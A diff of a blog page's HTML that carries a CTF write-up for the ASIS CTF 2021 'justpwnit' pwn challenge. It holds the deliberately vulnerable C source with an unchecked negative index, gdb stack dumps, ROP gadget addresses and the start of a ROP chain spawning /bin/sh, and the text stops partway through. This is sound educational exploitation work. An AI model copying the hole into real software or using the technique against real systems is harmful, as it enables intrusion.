+      <span class="material-symbols-rounded">menu</span>
     </div>
-    <div class="gblog-header__col-3 flex justify-end">
-      <span id="gblog-dark-mode">
-        <svg class="icon gblog_brightness_dark">
-          <title></title>
-          <use xlink:href="#gblog_brightness_dark"></use>
-        </svg>
-        <svg class="icon gblog_brightness_light">
-          <title></title>
-          <use xlink:href="#gblog_brightness_light"></use>
-        </svg>
-        <svg class="icon gblog_brightness_auto">
-          <title></title>
-          <use xlink:href="#gblog_brightness_auto"></use>
-        </svg>
-      </span>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">nasm </div>
+      <div class="dot"></div>
+      <div class="subtitle">pwn / kernel stuff </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
+         
+      </div>  
     </div>
   </div>
-</header>
-<nav class="gblog-nav">
-  <input type="checkbox" id="menu-control" class="hidden" />
-  <div class="gblog-nav__control">
-    <label for="menu-control" class="flex align-center justify-center">
-      <svg class="icon gblog_menu"><use xlink:href="#gblog_menu"></use></svg>
-      <svg class="icon gblog_clear"><use xlink:href="#gblog_clear"></use></svg>
-      <span>Navigation</span>
-    </label>
-  </div>
-  <ul class="gblog-nav__list container flex flex-wrap justify-center menu-content">
-    
-    
-    
-      
+</div>
 
   
-  
-  
-
-  
+  <div class="sticky">
     
       
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              https://github.com/n4sm
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_github"><use xlink:href="#gblog_github"></use></svg>
-            
-            Github Profile
-          </a>
-        </li>
-      
-    
-  
-    
-      
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              /posts/about
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
-            
-            About
-          </a>
-        </li>
-      
-    
-  
 
 
-
-
-
-
-    
-  </ul>
-</nav>
-
-
-
-      <main class="gblog-page container">
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/pwn/">
+                pwn
+                <div class="category-count">19</div>
+            </a>
         
-  <article class="gblog-post">
-    <header class="gblog-post__header">
-      
-      
-
-
-      <h1 class="gblog-post__title">[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit</h1>
-
-      
-        <div class="flex flex-wrap align-center gblog-post__meta gblog-post__meta--head">
-          <span class="flex align-center no-wrap">
-  <svg class="icon gblog_date"><use xlink:href="#gblog_date"></use></svg>
-  <span class="gblog-post__tag">
-    <time datetime="2021-10-24T00:00:00Z">
-      
-      Oct 24, 2021
-    </time>
-  </span>
-</span>
-
-<span class="flex align-center no-wrap">
-  <svg class="icon gblog_timer"><use xlink:href="#gblog_timer"></use></svg>
-  <span class="gblog-post__tag">13 min read</span>
-</span>
-
-
-
-
-
-  
-    
-    
-      
-        <span class="flex align-center no-wrap">
-          <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
-          
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a class="gblog-button__link" href="/authors/nasm/" title="All posts of this author">
-      nasm
-    </a>
-  </span>
-
-        </span>
-      
-    
-    
-  
-
-
-
-
-  
-    
-    
-      
-        <span class="flex align-center no-wrap">
-          <svg class="icon gblog_bookmark"><use xlink:href="#gblog_bookmark"></use></svg>
-          
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/ASIS-CTF/"
-      title="All posts tagged with 'ASIS CTF'"
-    >
-      ASIS CTF
-    </a>
-  </span>
-
-        </span>
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/ctf/"
-      title="All posts tagged with 'ctf'"
-    >
-      ctf
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/heap/"
-      title="All posts tagged with 'heap'"
-    >
-      heap
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/nasm/"
-      title="All posts tagged with 'nasm'"
-    >
-      nasm
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/oob-write/"
-      title="All posts tagged with 'oob write'"
-    >
-      oob write
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/pwn/"
-      title="All posts tagged with 'pwn'"
-    >
-      pwn
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/ret2school/"
-      title="All posts tagged with 'ret2school'"
-    >
-      ret2school
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/2021/"
-      title="All posts tagged with '2021'"
-    >
-      2021
-    </a>
-  </span>
-
-      
-    
-    
-  
-
-
-
-
-
-
+            <a class="category-link" href="/categories/kernel/">
+                kernel
+                <div class="category-count">3</div>
+            </a>
         </div>
+    </div>
+  </div>
+
+
+    
       
-    </header>
-    <section class="gblog-markdown">
-      <p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
-You can find the related files <a
-  class="gblog-markdown__link"
-  href="https://github.com/ret2school/ctf/blob/master/2021/asisctf"
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] window-of-opportunity
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] mailman
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-pwnasis" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   
-  >here</a
->.</p>
-<div class="gblog-post__anchorwrap">
-    <h1 id="justpwnit">
-        justpwnit
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#justpwnit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor justpwnit" href="#justpwnit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h1>
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        [ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit
+      </h1>
+    
+  
 </div>
-<p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
-The binary is statically linked and here is the checksec&rsquo;s output:</p>
-<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-</code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
-Here it is:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
-</span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
-</span><span class="cm"> */</span>
-<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define STR_SIZE 0x80
-</span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">set_element</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">parray</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%*c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">STR_SIZE</span><span class="p">)))</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">STR_SIZE</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
 
-<span class="kt">void</span> <span class="nf">justpwnit</span><span class="p">()</span> <span class="p">{</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">set_element</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="n">alarm</span><span class="p">(</span><span class="mi">180</span><span class="p">);</span>
-  <span class="n">justpwnit</span><span class="p">();</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
-Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
-<p>Let&rsquo;s see this in gdb !</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
-01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
-02:0010│         0x7ffef03864f0 ◂— 0x0
-03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
-04:0020│         0x7ffef0386500 ◂— 0x0
-05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
-06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
-07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
-08:0040│ rax     0x7ffef0386520 ◂— 0xb4
-09:0048│         0x7ffef0386528 ◂— 0x0
-... ↓            4 skipped
-0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
-0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
-</code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
-<p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
-01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
-02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
-03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
-04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
-05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
-06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
-07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
-08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
-09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
-... ↓            4 skipped                                                                                                                                                                     
-0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
-0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
-</code></pre><p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="ropchain">
-        ROPchain
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2021-10-24T00:00:00.000Z" itemprop="datePublished">2021-10-24</time>
 </div>
-<p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
-The binary is statically linked, and there is no system function in the binary, so we can&rsquo;t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            2.7k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2021/" rel="tag">2021</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASIS-CTF/" rel="tag">ASIS CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/oob-write/" rel="tag">oob write</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2school/" rel="tag">ret2school</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.<br>You can find the related files <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2021/asisctf">here</a>.</p>
+<h1 id="justpwnit"><a href="#justpwnit" class="headerlink" title="justpwnit"></a>justpwnit</h1><p>justpwnit was a warmup pwn challenge. That’s only a basic stack overflow.<br>The binary is statically linked and here is the checksec’s output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/nasm/justpwnit&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>Morever the source code is provided as it is the case for all the pwn tasks !<br>Here it is:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_SIZE 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_element</span><span class="params">(<span class="type">char</span> **parray)</span> &#123;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;index) != <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (!(parray[index] = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>), STR_SIZE)))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!fgets(parray[index], STR_SIZE, <span class="built_in">stdin</span>))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">justpwnit</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *<span class="built_in">array</span>[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    set_element(<span class="built_in">array</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  justpwnit();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.<br>Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
+<p>Let’s see this in gdb !</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      </span><br><span class="line">02:0010│         0x7ffef03864f0 ◂— 0x0</span><br><span class="line">03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* &#x27;?=@&#x27; */</span><br><span class="line">04:0020│         0x7ffef0386500 ◂— 0x0</span><br><span class="line">05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 </span><br><span class="line">06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1</span><br><span class="line">07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1</span><br><span class="line">08:0040│ rax     0x7ffef0386520 ◂— 0xb4</span><br><span class="line">09:0048│         0x7ffef0386528 ◂— 0x0</span><br><span class="line">... ↓            4 skipped</span><br><span class="line">0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1</span><br><span class="line">0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0</span><br></pre></td></tr></table></figure>
+
+<p>That’s the stack’s state when we are calling calloc. We can see the <code>set_element</code>‘s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
+<p>Then, if we do so, the stack’s state looks like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      </span><br><span class="line">02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* &#x27;?=@&#x27; */                                                                                                                              </span><br><span class="line">04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         </span><br><span class="line">05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  </span><br><span class="line">06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       </span><br><span class="line">07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    </span><br><span class="line">08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        </span><br><span class="line">09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         </span><br><span class="line">... ↓            4 skipped                                                                                                                                                                     </span><br><span class="line">0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       </span><br><span class="line">0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         </span><br></pre></td></tr></table></figure>
+
+<p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
+<h2 id="ROPchain"><a href="#ROPchain" class="headerlink" title="ROPchain"></a>ROPchain</h2><p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.<br>The binary is statically linked, and there is no system function in the binary, so we can’t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
 <p>And so what we need is:</p>
 <ul>
 <li>pop rdi gadget</li>
@@ -677,586 +269,118 @@ The binary is statically linked, and there is no system function in the binary, 
 <li>pop rdx gadget</li>
 <li>pop rax gadget</li>
 <li>syscall gadget</li>
-<li>mov qword ptr [reg], reg [to write &ldquo;/bin/sh\0&rdquo;] in a writable area</li>
+<li>mov qword ptr [reg], reg [to write “&#x2F;bin&#x2F;sh\0”] in a writable area</li>
 </ul>
-<p>We can easily find these gadgets with the help <a
-  class="gblog-markdown__link"
-  href="https://github.com/JonathanSalwan/ROPgadget"
-  
-  >ROPgadget</a
->.
-We got:</p>
-<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
-0x0000000000401001 : pop rax ; ret
-0x00000000004019a3 : pop rsi ; ret
-0x00000000004013e9 : syscall
-0x0000000000403d23 : pop rdx ; ret
-0x0000000000401b0d : pop rdi ; ret
-</code></pre><p>Now we just have to craft the ropchain !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
-<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
-<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
-<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
-<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>
+<p>We can easily find these gadgets with the help <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>.<br>We got:</p>
